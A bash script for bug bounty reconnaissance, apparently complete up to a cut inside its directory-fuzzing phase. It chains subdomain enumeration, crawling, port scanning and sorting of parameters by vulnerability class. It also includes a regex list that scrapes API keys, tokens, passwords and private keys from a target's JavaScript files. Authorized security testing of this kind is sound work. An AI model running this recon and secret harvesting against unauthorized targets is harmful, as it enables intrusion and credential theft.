#!/bin/bash
# ============================================================
#  recon_linux.sh — Full Recon & Vuln Scanner (Linux)
#  Uses: subfinder, amass, assetfinder, httpx, katana,
#        gospider, hakrawler, waybackurls, gau, subjs,
#        LinkFinder, nuclei, dalfox, gf, ffuf, nmap,
#        naabu, dnsx, anew, uro, qsreplace, sqlmap, nikto
#
#  For AUTHORIZED security testing / bug bounty only.
#  Usage: bash recon_linux.sh -d example.com [options]
# ============================================================

set -euo pipefail

# ── Colours ────────────────────────────────────────────────
RED='\033[0;31m';   GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m';  CYAN='\033[0;36m';  WHITE='\033[1;37m'
BOLD='\033[1m';     NC='\033[0m'

banner() {
cat << 'EOF'

 ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗    ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
 ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║    ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
 ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║    ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝
 ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║    ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗
 ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║    ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
 ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝

          Full Recon & Vulnerability Scanner — Linux Edition
          For AUTHORIZED security testing / bug bounty only!   By-- VTRAP
EOF
}

# ── Logging helpers ────────────────────────────────────────
info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[✗]${NC} $*"; }
phase()   { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════════${NC}"; \
            echo -e "${BOLD}${BLUE}  $*${NC}"; \
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════════${NC}"; }
found()   { echo -e "${GREEN}[FOUND]${NC} $*"; }

# ── Defaults ────────────────────────────────────────────────
THREADS=50
TIMEOUT=10
WORDLIST="/usr/share/wordlists/dirb/common.txt"
RESOLVERS="/tmp/resolvers.txt"
INSTALL_MISSING=false
SKIP_HEAVY=false       # skip nmap, amass, sqlmap (slow)
SKIP_FUZZ=false
OUT_DIR="./recon_results"
DOMAIN=""
LINKFINDER_DIR="$HOME/tools/LinkFinder"
LINKFINDER_PYTHON="python3"

# ── Argument parsing ────────────────────────────────────────
usage() {
  echo -e "\n${BOLD}Usage:${NC} bash recon_linux.sh -d <domain> [options]\n"
  echo "  -d  domain          Target domain (required)"
  echo "  -o  dir             Output directory (default: ./recon_results/<domain>)"
  echo "  -t  threads         Thread count (default: 50)"
  echo "  -w  wordlist        Wordlist for ffuf/gobuster"
  echo "  --install           Auto-install missing Go tools"
  echo "  --skip-heavy        Skip slow tools: nmap, amass, sqlmap"
  echo "  --skip-fuzz         Skip directory fuzzing (ffuf)"
  echo "  -h                  Show this help"
  echo ""
  echo "Examples:"
  echo "  bash recon_linux.sh -d example.com"
  echo "  bash recon_linux.sh -d example.com --install --skip-heavy"
  exit 0
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    -d)  DOMAIN="$2";     shift 2 ;;
    -o)  OUT_DIR="$2";    shift 2 ;;
    -t)  THREADS="$2";    shift 2 ;;
    -w)  WORDLIST="$2";   shift 2 ;;
    --install)     INSTALL_MISSING=true; shift ;;
    --skip-heavy)  SKIP_HEAVY=true;      shift ;;
    --skip-fuzz)   SKIP_FUZZ=true;       shift ;;
    -h|--help)     usage ;;
    *)   error "Unknown option: $1"; usage ;;
  esac
done

[[ -z "$DOMAIN" ]] && { error "Domain is required. Use -d example.com"; usage; }

OUT="$OUT_DIR/$DOMAIN"
mkdir -p "$OUT"

# Sub-directories for cleaner output
mkdir -p "$OUT/subdomains" "$OUT/urls" "$OUT/js" \
         "$OUT/params"     "$OUT/vulns" "$OUT/ports" \
         "$OUT/screenshots" "$OUT/fuzzing"

# ── Tool checker / installer ────────────────────────────────
GO_TOOLS=(
  "subfinder:github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
  "httpx:github.com/projectdiscovery/httpx/cmd/httpx@latest"
  "nuclei:github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
  "katana:github.com/projectdiscovery/katana/cmd/katana@latest"
  "naabu:github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
  "dnsx:github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
  "waybackurls:github.com/tomnomnom/waybackurls@latest"
  "assetfinder:github.com/tomnomnom/assetfinder@latest"
  "httprobe:github.com/tomnomnom/httprobe@latest"
  "anew:github.com/tomnomnom/anew@latest"
  "gf:github.com/tomnomnom/gf@latest"
  "qsreplace:github.com/tomnomnom/qsreplace@latest"
  "hakrawler:github.com/hakluke/hakrawler@latest"
  "gau:github.com/lc/gau/v2/cmd/gau@latest"
  "dalfox:github.com/hahwul/dalfox/v2@latest"
  "gospider:github.com/jaeles-project/gospider@latest"
  "ffuf:github.com/ffuf/ffuf/v2@latest"
  "subjs:github.com/lc/subjs@latest"
  "kxss:github.com/Emoe/kxss@latest"
  "interactsh-client:github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
)

APT_TOOLS=(nmap nikto whatweb amass dnsutils curl wget python3 python3-pip git)

# ── Auto-locate a binary in common install dirs and add its dir to PATH ──
find_tool() {
  local tool="$1"
  local dir
  local search_dirs=(
    "$HOME/go/bin"
    "$HOME/.local/bin"
    "$HOME/tools"
    "$HOME/tools/bin"
    "/usr/local/bin"
    "/snap/bin"
    "/opt/homebrew/bin"
  )
  if command -v go &>/dev/null; then
    local gobin
    gobin="$(go env GOPATH 2>/dev/null)/bin"
    [[ -n "$gobin" && "$gobin" != "/bin" ]] && search_dirs+=("$gobin")
  fi
  for dir in "${search_dirs[@]}"; do
    if [[ -x "$dir/$tool" ]]; then
      if [[ ":$PATH:" != *":$dir:"* ]]; then
        export PATH="$PATH:$dir"
        info "Found $tool at $dir — added to PATH"
      fi
      return 0
    fi
  done
  return 1
}

# ── Install a Python CLI tool safely, bypassing PEP 668 restrictions ─────
install_python_tool() {
  local package="$1"
  local tool="${2:-$1}"

  # Prefer pipx — manages isolated venvs automatically
  if ! command -v pipx &>/dev/null; then
    sudo apt-get install -y -qq pipx 2>/dev/null || true
    export PATH="$PATH:$HOME/.local/bin"
  fi
  if command -v pipx &>/dev/null; then
    if pipx install "$package" -q 2>/dev/null; then
      export PATH="$PATH:$HOME/.local/bin"
      success "$tool installed via pipx"
      return 0
    fi
  fi

  # Fallback: dedicated venv + symlink into ~/.local/bin
  local venv_dir="$HOME/.venvs/$tool"
  info "Using venv for $tool …"
  if python3 -m venv "$venv_dir" 2>/dev/null \
     && "$venv_dir/bin/pip" install -q "$package"; then
    mkdir -p "$HOME/.local/bin"
    ln -sf "$venv_dir/bin/$tool" "$HOME/.local/bin/$tool" 2>/dev/null || true
    export PATH="$PATH:$HOME/.local/bin"
    success "$tool installed via venv"
    return 0
  fi

  warn "Could not install $tool"
  return 1
}

check_and_install_tools() {
  phase "Tool Check & Installation"

  # Check Go
  if ! command -v go &>/dev/null; then
    warn "Go not found. Go tools won't be installed automatically."
    warn "Install Go: https://go.dev/dl/"
    HAS_GO=false
  else
    HAS_GO=true
    success "Go $(go version | awk '{print $3}') found"
    export GOPATH="$HOME/go"
    export PATH="$PATH:$GOPATH/bin"
  fi

  # APT tools
  missing_apt=()
  for tool in "${APT_TOOLS[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
      missing_apt+=("$tool")
    fi
  done

  if [[ ${#missing_apt[@]} -gt 0 ]]; then
    if $INSTALL_MISSING; then
      info "Installing apt tools: ${missing_apt[*]}"
      sudo apt-get update -qq
      sudo apt-get install -y -qq "${missing_apt[@]}"
    else
      warn "Missing apt tools: ${missing_apt[*]}"
      warn "Run with --install to auto-install, or: sudo apt install ${missing_apt[*]}"
    fi
  fi

  # Go tools
  echo ""
  missing_go=()
  for entry in "${GO_TOOLS[@]}"; do
    tool="${entry%%:*}"
    pkg="${entry##*:}"
    if command -v "$tool" &>/dev/null; then
      success "$tool ✓"
    elif find_tool "$tool"; then
      success "$tool ✓"
    else
      missing_go+=("$tool")
      warn "$tool ✗ (not found)"
      if $HAS_GO; then
        if $INSTALL_MISSING; then
          info "Installing $tool …"
          if go install "$pkg" 2>/dev/null; then
            find_tool "$tool" || true
            success "$tool installed"
          else
            warn "Failed to install $tool"
          fi
        else
          warn "Run with --install to auto-install, or: go install $pkg"
        fi
      else
        warn "Go not found — cannot auto-install $tool"
      fi
    fi
  done

  # uro (Python)
  if ! command -v uro &>/dev/null && ! find_tool "uro"; then
    warn "uro not found"
    if $INSTALL_MISSING; then
      install_python_tool "uro"
    else
      warn "Run with --install to auto-install uro"
    fi
  else
    success "uro ✓"
  fi

  # LinkFinder (Python) — uses a dedicated venv to avoid PEP 668
  if [[ ! -f "$LINKFINDER_DIR/linkfinder.py" ]]; then
    warn "LinkFinder not found at $LINKFINDER_DIR"
    if $INSTALL_MISSING; then
      mkdir -p "$HOME/tools"
      git clone -q https://github.com/GerbenJavado/LinkFinder.git "$LINKFINDER_DIR"
      python3 -m venv "$LINKFINDER_DIR/venv" \
        && "$LINKFINDER_DIR/venv/bin/pip" install -q -r "$LINKFINDER_DIR/requirements.txt" \
        && success "LinkFinder installed" \
        || warn "LinkFinder dependency install failed"
    fi
  fi
  if [[ -f "$LINKFINDER_DIR/linkfinder.py" ]]; then
    if [[ ! -x "$LINKFINDER_DIR/venv/bin/python" ]]; then
      info "Setting up LinkFinder venv …"
      python3 -m venv "$LINKFINDER_DIR/venv" \
        && "$LINKFINDER_DIR/venv/bin/pip" install -q -r "$LINKFINDER_DIR/requirements.txt" \
        2>/dev/null || true
    fi
    if [[ -x "$LINKFINDER_DIR/venv/bin/python" ]]; then
      LINKFINDER_PYTHON="$LINKFINDER_DIR/venv/bin/python"
    fi
    success "LinkFinder ✓ (python: $LINKFINDER_PYTHON)"
  fi

  # nuclei templates
  if command -v nuclei &>/dev/null; then
    info "Updating nuclei templates …"
    nuclei -update-templates -silent 2>/dev/null || true
  fi

  # Setup gf patterns
  if command -v gf &>/dev/null; then
    GF_PATTERNS_DIR="$HOME/.gf"
    if [[ ! -d "$GF_PATTERNS_DIR" ]]; then
      mkdir -p "$GF_PATTERNS_DIR"
      if [[ -d "$HOME/tools/Gf-Patterns" ]]; then
        cp "$HOME/tools/Gf-Patterns"/*.json "$GF_PATTERNS_DIR/" 2>/dev/null || true
      else
        $INSTALL_MISSING && git clone -q https://github.com/1ndianl33t/Gf-Patterns \
          "$HOME/tools/Gf-Patterns" && \
          cp "$HOME/tools/Gf-Patterns"/*.json "$GF_PATTERNS_DIR/" 2>/dev/null || true
      fi
    fi
  fi

  echo ""
  info "Tool check done. Missing tools will be skipped gracefully."
}

# ── Helper: run a command only if tool exists ───────────────
run_if() {
  local tool="$1"; shift
  if command -v "$tool" &>/dev/null; then
    "$tool" "$@"
  else
    warn "$tool not found — skipping"
    return 0
  fi
}

count_lines() { [[ -f "$1" ]] && wc -l < "$1" || echo 0; }

# ── Default resolver list ───────────────────────────────────
make_resolvers() {
  cat > "$RESOLVERS" << 'EOF'
8.8.8.8
8.8.4.4
1.1.1.1
1.0.0.1
9.9.9.9
208.67.222.222
208.67.220.220
EOF
}

# ═══════════════════════════════════════════════════════════
#  PHASE 1 — Subdomain Enumeration
# ═══════════════════════════════════════════════════════════
phase1_subdomains() {
  phase "PHASE 1 — Subdomain Enumeration"
  local sub_dir="$OUT/subdomains"
  local all="$sub_dir/all_subdomains.txt"

  # 1a. subfinder (passive, multi-source)
  info "Running subfinder …"
  run_if subfinder -d "$DOMAIN" -silent -all -o "$sub_dir/subfinder.txt" 2>/dev/null \
    && success "subfinder: $(count_lines "$sub_dir/subfinder.txt") subdomains"

  # 1b. assetfinder
  info "Running assetfinder …"
  run_if assetfinder --subs-only "$DOMAIN" 2>/dev/null \
    | grep "\.$DOMAIN$" > "$sub_dir/assetfinder.txt" \
    && success "assetfinder: $(count_lines "$sub_dir/assetfinder.txt") subdomains"

  # 1c. amass passive (slow but thorough)
  if ! $SKIP_HEAVY && command -v amass &>/dev/null; then
    info "Running amass passive (may take a few minutes) …"
    amass enum -passive -d "$DOMAIN" -o "$sub_dir/amass.txt" 2>/dev/null \
      && success "amass: $(count_lines "$sub_dir/amass.txt") subdomains"
  fi

  # 1d. crt.sh via curl
  info "Querying crt.sh …"
  curl -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null \
    | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  [print(n.strip().lstrip('*.')) for e in data for n in e.get('name_value','').split('\n') if '$DOMAIN' in n]
except: pass
" | sort -u > "$sub_dir/crtsh.txt" \
    && success "crt.sh: $(count_lines "$sub_dir/crtsh.txt") subdomains"

  # 1e. DNS brute force with dnsx + a wordlist
  if command -v dnsx &>/dev/null; then
    info "DNS brute-force with dnsx …"
    # Use a quick built-in mini-wordlist if no external one
    python3 -c "
subs=['www','api','dev','test','staging','prod','admin','mail','ftp','vpn','app','portal',
      'beta','demo','docs','cdn','static','assets','media','login','auth','sso','git',
      'gitlab','jenkins','jira','wiki','support','help','dashboard','console','backend',
      'mobile','shop','store','pay','billing','account','accounts','internal','intranet',
      'monitor','status','grafana','kibana','elastic','redis','db','mysql','mongodb',
      's3','api2','v1','v2','graphql','sandbox','uat','qa','legacy','old','new',
      'forum','community','blog','news','search','panel','manage','upload','files',
      'download','report','reports','analytics','track','logs','audit','backup']
import sys
domain=sys.argv[1]
for s in subs: print(f'{s}.{domain}')
" "$DOMAIN" | dnsx -silent -r "$RESOLVERS" -o "$sub_dir/dnsx_brute.txt" 2>/dev/null \
    && success "dnsx brute: $(count_lines "$sub_dir/dnsx_brute.txt") subdomains"
  fi

  # Merge + deduplicate
  cat "$sub_dir"/*.txt 2>/dev/null \
    | grep -E "^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$" \
    | grep "$DOMAIN$" \
    | sort -u > "$all"

  success "Total unique subdomains: $(count_lines "$all")"
}

# ═══════════════════════════════════════════════════════════
#  PHASE 2 — DNS Resolution & Live Check
# ═══════════════════════════════════════════════════════════
phase2_live() {
  phase "PHASE 2 — DNS Resolution & Live Host Detection"
  local all="$OUT/subdomains/all_subdomains.txt"
  local resolved="$OUT/subdomains/resolved.txt"
  local live_domains="$OUT/live_domains.txt"
  local dead_domains="$OUT/dead_domains.txt"
  local live_urls="$OUT/live_urls.txt"

  # DNS resolution check
  if command -v dnsx &>/dev/null; then
    info "Resolving subdomains via dnsx …"
    dnsx -l "$all" -silent -r "$RESOLVERS" -o "$resolved" 2>/dev/null \
      && success "Resolved: $(count_lines "$resolved") hosts"
  else
    cp "$all" "$resolved"
  fi

  # HTTP liveness probe with httpx
  info "Probing live hosts with httpx …"
  if command -v httpx &>/dev/null; then
    httpx -l "$resolved" -silent \
      -status-code -title -tech-detect -content-length \
      -threads "$THREADS" \
      -o "$OUT/httpx_full.txt" 2>/dev/null

    # Separate live vs dead
    awk '{print $1}' "$OUT/httpx_full.txt" 2>/dev/null \
      | sed 's|https\?://||' | sort -u > "$live_domains"

    comm -23 \
      <(sort "$resolved") \
      <(sort "$live_domains") > "$dead_domains" 2>/dev/null || true

    # Full URLs (http + https)
    awk '{print $1}' "$OUT/httpx_full.txt" 2>/dev/null \
      | sort -u > "$live_urls"

    success "Live domains  → $live_domains ($(count_lines "$live_domains"))"
    success "Dead domains  → $dead_domains ($(count_lines "$dead_domains"))"
    success "Live URLs     → $live_urls"
  else
    # Fallback: httprobe
    info "httpx not found, using httprobe …"
    cat "$resolved" | run_if httprobe \
      | sort -u > "$live_urls"
    sed 's|https\?://||' "$live_urls" | sort -u > "$live_domains"
    success "Live URLs: $(count_lines "$live_urls")"
  fi

  # Print technology findings
  if [[ -f "$OUT/httpx_full.txt" ]]; then
    info "Technology fingerprints (top 20):"
    grep -oP '\[.*?\]' "$OUT/httpx_full.txt" 2>/dev/null \
      | sort | uniq -c | sort -rn | head -20 || true
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 3 — URL & Endpoint Discovery
# ═══════════════════════════════════════════════════════════
phase3_urls() {
  phase "PHASE 3 — URL & Endpoint Discovery"
  local live_urls="$OUT/live_urls.txt"
  local url_dir="$OUT/urls"
  local all_urls="$url_dir/all_urls.txt"

  # 3a. Wayback Machine
  info "Fetching URLs from Wayback Machine (waybackurls) …"
  run_if waybackurls "$DOMAIN" 2>/dev/null \
    | sort -u > "$url_dir/wayback.txt" \
    && success "waybackurls: $(count_lines "$url_dir/wayback.txt") URLs"

  # 3b. gau — GetAllURLs (Common Crawl + Wayback + OTX)
  info "Fetching URLs via gau (CommonCrawl + Wayback + OTX) …"
  run_if gau "$DOMAIN" --subs --threads "$THREADS" 2>/dev/null \
    | sort -u > "$url_dir/gau.txt" \
    && success "gau: $(count_lines "$url_dir/gau.txt") URLs"

  # 3c. katana (active crawler — best for modern SPAs)
  info "Active crawl with katana …"
  if command -v katana &>/dev/null && [[ -f "$live_urls" ]]; then
    katana -list "$live_urls" -silent \
      -depth 3 \
      -js-crawl \
      -known-files all \
      -concurrency "$THREADS" \
      -timeout "$TIMEOUT" \
      -o "$url_dir/katana.txt" 2>/dev/null \
      && success "katana: $(count_lines "$url_dir/katana.txt") URLs"
  fi

  # 3d. gospider
  info "Crawling with gospider …"
  if command -v gospider &>/dev/null && [[ -f "$live_urls" ]]; then
    gospider -S "$live_urls" \
      -d 3 -c "$THREADS" \
      --sitemap --robots \
      -o "$url_dir/gospider_raw" 2>/dev/null
    # gospider writes one file per target, merge them
    cat "$url_dir/gospider_raw"/* 2>/dev/null \
      | grep -oP 'https?://[^\s"]+' \
      | sort -u > "$url_dir/gospider.txt"
    success "gospider: $(count_lines "$url_dir/gospider.txt") URLs"
  fi

  # 3e. hakrawler
  info "Crawling with hakrawler …"
  if command -v hakrawler &>/dev/null && [[ -f "$live_urls" ]]; then
    cat "$live_urls" \
      | hakrawler -depth 3 -subs -js -forms 2>/dev/null \
      | sort -u > "$url_dir/hakrawler.txt" \
      && success "hakrawler: $(count_lines "$url_dir/hakrawler.txt") URLs"
  fi

  # Merge all URLs + deduplicate with uro
  info "Merging and deduplicating all URLs …"
  cat "$url_dir"/*.txt 2>/dev/null \
    | grep -E "^https?://" \
    | sort -u > "$url_dir/merged_raw.txt"

  if command -v uro &>/dev/null; then
    uro -i "$url_dir/merged_raw.txt" -o "$all_urls" 2>/dev/null \
      && success "After uro dedup: $(count_lines "$all_urls") URLs (from $(count_lines "$url_dir/merged_raw.txt") raw)"
  else
    cp "$url_dir/merged_raw.txt" "$all_urls"
    success "Merged: $(count_lines "$all_urls") URLs"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 4 — JS File Discovery & Endpoint Mining
# ═══════════════════════════════════════════════════════════
phase4_js() {
  phase "PHASE 4 — JS File Discovery & Endpoint Mining"
  local js_dir="$OUT/js"
  local live_urls="$OUT/live_urls.txt"
  local all_urls="$OUT/urls/all_urls.txt"

  # 4a. Extract JS URLs from all discovered URLs
  info "Extracting JS file URLs …"
  grep -E "\.js(\?|$|#)" "$all_urls" 2>/dev/null \
    | sort -u > "$js_dir/js_urls.txt" \
    && success "JS files from URLs: $(count_lines "$js_dir/js_urls.txt")"

  # 4b. subjs — finds JS files from live domains
  info "Running subjs on live domains …"
  if command -v subjs &>/dev/null && [[ -f "$live_urls" ]]; then
    cat "$live_urls" \
      | subjs 2>/dev/null \
      | sort -u | anew "$js_dir/js_urls.txt" > /dev/null 2>&1 || true
    success "After subjs: $(count_lines "$js_dir/js_urls.txt") JS files"
  fi

  # 4c. getJS via curl (inline JS link extraction)
  info "Extracting additional JS links via curl + regex …"
  if [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
      curl -sk --max-time "$TIMEOUT" "$url" 2>/dev/null \
        | grep -oP '(?:src|href)=["'"'"'][^"'"'"']*\.js[^"'"'"']*["'"'"']' \
        | grep -oP 'https?://[^"'"'"']+|/[^"'"'"' >]+\.js[^"'"'"' >]*' \
        | sed "s|^/|${url%/*}/|" \
        | grep -v '^/' >> "$js_dir/js_urls.txt" 2>/dev/null || true
    done < <(head -20 "$live_urls")
    sort -u -o "$js_dir/js_urls.txt" "$js_dir/js_urls.txt"
    success "JS file list (final): $(count_lines "$js_dir/js_urls.txt")"
  fi

  # 4d. LinkFinder — extract endpoints from each JS file
  info "Running LinkFinder on JS files …"
  local lf_out="$js_dir/linkfinder_endpoints.txt"
  if [[ -f "$LINKFINDER_DIR/linkfinder.py" ]] && [[ -f "$js_dir/js_urls.txt" ]]; then
    > "$lf_out"
    while IFS= read -r jsurl; do
      "$LINKFINDER_PYTHON" "$LINKFINDER_DIR/linkfinder.py" \
        -i "$jsurl" -o cli 2>/dev/null \
        | grep -E "^/" \
        >> "$lf_out" || true
    done < "$js_dir/js_urls.txt"
    sort -u -o "$lf_out" "$lf_out"
    success "LinkFinder endpoints: $(count_lines "$lf_out")"
  fi

  # 4e. Regex mining from downloaded JS
  info "Mining JS files for secrets & API endpoints via regex …"
  local secrets_out="$js_dir/js_secrets.txt"
  > "$secrets_out"

  SECRET_PATTERNS=(
    "api[_-]?key\s*[=:]\s*['\"][0-9a-zA-Z_\-]{20,}['\"]"
    "secret[_-]?key\s*[=:]\s*['\"][0-9a-zA-Z_\-]{20,}['\"]"
    "access[_-]?token\s*[=:]\s*['\"][0-9a-zA-Z_\-]{20,}['\"]"
    "password\s*[=:]\s*['\"][^'\"]{6,}['\"]"
    "Authorization:\s*Bearer\s+[a-zA-Z0-9._\-]+"
    "AWS_ACCESS_KEY_ID\s*[=:]\s*['\"][A-Z0-9]{20}['\"]"
    "private[_-]key"
    "BEGIN RSA PRIVATE KEY"
    "firebase[a-zA-Z0-9._/\-]*\.json"
    "mongodb\+srv://[^\"' ]+"
    "jdbc:[a-z]+://[^\"' ]+"
  )

  if [[ -f "$js_dir/js_urls.txt" ]]; then
    while IFS= read -r jsurl; do
      content=$(curl -sk --max-time "$TIMEOUT" "$jsurl" 2>/dev/null)
      for pat in "${SECRET_PATTERNS[@]}"; do
        echo "$content" \
          | grep -oiP "$pat" \
          | while read -r match; do
              echo "[SECRET-CANDIDATE] $jsurl  →  $match" >> "$secrets_out"
            done
      done
    done < <(head -50 "$js_dir/js_urls.txt")
    [[ -s "$secrets_out" ]] \
      && warn "Possible secrets found → $secrets_out ($(count_lines "$secrets_out") lines)" \
      || success "No obvious secrets found in JS"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 5 — Parameter URL Extraction & Categorisation
# ═══════════════════════════════════════════════════════════
phase5_params() {
  phase "PHASE 5 — Parameter URL Extraction & Categorisation"
  local all_urls="$OUT/urls/all_urls.txt"
  local param_dir="$OUT/params"

  # All URLs containing ? or =
  info "Extracting parameterized URLs …"
  grep -E "\?.*=" "$all_urls" 2>/dev/null \
    | sort -u > "$param_dir/all_param_urls.txt"
  success "Param URLs (? and =): $(count_lines "$param_dir/all_param_urls.txt")"

  # URLs with only ?
  grep "?" "$all_urls" 2>/dev/null | sort -u > "$param_dir/urls_with_question.txt"
  success "URLs with ?         : $(count_lines "$param_dir/urls_with_question.txt")"

  # URLs with only =
  grep "=" "$all_urls" 2>/dev/null | sort -u > "$param_dir/urls_with_equals.txt"
  success "URLs with =         : $(count_lines "$param_dir/urls_with_equals.txt")"

  # Use gf patterns to sort by vulnerability class
  if command -v gf &>/dev/null && [[ -f "$param_dir/all_param_urls.txt" ]]; then
    info "Sorting param URLs by vuln class using gf …"

    local gf_patterns=(
      "sqli"
      "xss"
      "ssrf"
      "idor"
      "redirect"
      "lfi"
      "rce"
      "ssti"
      "debug_logic"
      "upload-fields"
      "interestingparams"
      "interestingsubs"
    )

    for pattern in "${gf_patterns[@]}"; do
      if gf "$pattern" --list &>/dev/null 2>&1 || \
         [[ -f "$HOME/.gf/${pattern}.json" ]]; then
        gf "$pattern" "$param_dir/all_param_urls.txt" 2>/dev/null \
          | sort -u > "$param_dir/gf_${pattern}.txt"
        count=$(count_lines "$param_dir/gf_${pattern}.txt")
        [[ $count -gt 0 ]] && found "gf_${pattern}.txt: $count URLs"
      fi
    done
  fi

  # Extract unique parameter names
  info "Extracting unique parameter names …"
  grep -oP '[?&][a-zA-Z0-9_\-]+=' "$param_dir/all_param_urls.txt" 2>/dev/null \
    | tr -d '?&=' | sort -u > "$param_dir/unique_param_names.txt"
  success "Unique param names: $(count_lines "$param_dir/unique_param_names.txt")"

  # ── Separate URLs by file extension ───────────────────────────────
  info "Separating URLs by file extension …"
  for ext in php asp aspx jsp cfm cgi pl py rb action do; do
    grep -iE "\\.${ext}(\\?|$|#)" "$all_urls" 2>/dev/null \
      | sort -u > "$param_dir/ext_${ext}.txt"
    count=$(count_lines "$param_dir/ext_${ext}.txt")
    [[ $count -gt 0 ]] && found "ext_${ext}.txt → $count URLs"
  done

  # ── Categorise parameterised URLs by vulnerability hint ───────────
  info "Categorising URLs by vulnerability class hint …"

  # Open Redirect / SSRF
  grep -iE "[?&](url|redirect|next|return|returnto|return_to|goto|dest|destination|redir|redirect_uri|callback|continue|forward|link|src|source|href|ref|referer|location|target|to|from|go|navigate)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_redirect_ssrf.txt"

  # LFI / path traversal
  grep -iE "[?&](file|path|filepath|dir|directory|folder|page|include|require|template|view|load|read|document|root|pg|style|layout|module|conf|config|tpl|tmpl|base|prefix|suffix|type|content|data|resource|func|func_name)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_lfi.txt"

  # IDOR (numeric / object IDs)
  grep -iE "[?&](id|uid|userid|user_id|account|account_id|number|order|order_id|invoice|pid|cid|bid|docid|recid|record|item|object|key|token|ref|reference|uuid|guid|serial|no|num|idx|index)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_idor.txt"

  # SQLi (search / filter / sort params)
  grep -iE "[?&](query|search|q|s|sort|order|by|cat|category|filter|where|limit|offset|num|count|keyword|find|select|from|name|username|email|lang|type)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_sqli.txt"

  # XSS (reflected output params)
  grep -iE "[?&](name|username|title|msg|message|comment|text|body|content|description|data|input|value|field|label|search|q|term|query|error|info|notice|status|type|format|display|show|output|result|feedback|note|subject|reason|detail)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_xss.txt"

  # SSTI / template injection
  grep -iE "[?&](template|theme|layout|lang|locale|format|engine|render|style|view|tpl|tmpl|skin|color|mode|design)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_ssti.txt"

  # Command injection / RCE
  grep -iE "[?&](cmd|command|exec|execute|run|system|shell|ping|host|ip|addr|address|query|payload|code|arg|args|param|params|test|input|debug|eval|expr|op|action)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_cmdi.txt"

  for hint in redirect_ssrf lfi idor sqli xss ssti cmdi; do
    count=$(count_lines "$param_dir/hint_${hint}.txt")
    [[ $count -gt 0 ]] && found "hint_${hint}.txt → $count URLs"
  done

  # All interesting params in one file
  cat "$param_dir"/hint_*.txt 2>/dev/null | sort -u > "$param_dir/interesting_params.txt"
  success "All interesting-param URLs: $(count_lines "$param_dir/interesting_params.txt")"
}

# ═══════════════════════════════════════════════════════════
#  PHASE 6 — Port Scanning
# ═══════════════════════════════════════════════════════════
phase6_ports() {
  phase "PHASE 6 — Port Scanning"

  if $SKIP_HEAVY; then
    warn "Skipping port scan (--skip-heavy)"
    return 0
  fi

  local live_domains="$OUT/live_domains.txt"
  local ports_dir="$OUT/ports"

  # naabu (fast port scanner by ProjectDiscovery)
  if command -v naabu &>/dev/null && [[ -f "$live_domains" ]]; then
    info "Running naabu port scan (top 1000 ports) …"
    naabu -l "$live_domains" \
      -top-ports 1000 \
      -silent \
      -rate 500 \
      -o "$ports_dir/naabu.txt" 2>/dev/null \
      && success "naabu: $(count_lines "$ports_dir/naabu.txt") open ports"
  fi

  # nmap — deeper scan on interesting ports
  if command -v nmap &>/dev/null && [[ -f "$live_domains" ]]; then
    info "Running nmap service/version scan on top 200 ports …"
    nmap -sV -sC \
      --top-ports 200 \
      --open \
      --max-retries 2 \
      --host-timeout 60s \
      -iL "$live_domains" \
      -oN "$ports_dir/nmap.txt" \
      -oX "$ports_dir/nmap.xml" \
      2>/dev/null \
      && success "nmap done → $ports_dir/nmap.txt"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 7 — Directory & File Fuzzing
# ═══════════════════════════════════════════════════════════
phase7_fuzz() {
  phase "PHASE 7 — Directory & File Fuzzing"

  if $SKIP_FUZZ; then
    warn "Skipping fuzzing (--skip-fuzz)"
    return 0
  fi

  local live_urls="$OUT/live_urls.txt"
  local fuzz_dir="$OUT/fuzzing"

  [[ ! -f "$WORDLIST" ]] && \
    WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
  [[ ! -f "$WORDLIST" ]] && \
    WORDLIST="/usr/share/wordlists/dirb/common.txt"
  [[ ! -f "$WORDLIST" ]] && \
    { warn "No wordlist found. Skipping fuzzing. Install seclists: sudo apt install seclists"; return 0; }

  info "Wordlist: $WORDLIST"

  if command -v ffuf &>/dev/null && [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
